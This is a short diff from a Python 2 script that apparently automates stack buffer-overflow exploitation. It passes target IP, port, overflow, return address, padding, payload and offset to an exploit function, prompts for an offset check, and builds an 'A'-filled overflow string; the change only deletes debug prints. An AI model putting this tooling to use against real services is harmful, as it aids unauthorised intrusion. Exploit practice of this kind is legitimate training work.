@@ -333,15 +333,12 @@ def auto():
 	
 	# EXPLOIT 1
 	PAYLOAD = RESULT[1][1]
-	print PAYLOAD
 	RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
-	print RESULT
 	
 	# CHECK OFFSET PATTERN
 	OPTIONS = raw_input(cyan("\n[+] Do you want to check offset manually (y/n)?"))
 	if OPTIONS == 'y':
 		RESULT = poffset()
-		print RESULT
 	else:
 		OFFSET = int(raw_input(cyan("\n[+] What is the Offset you found?")))
 		OVERFLOW = "A" * OFFSET
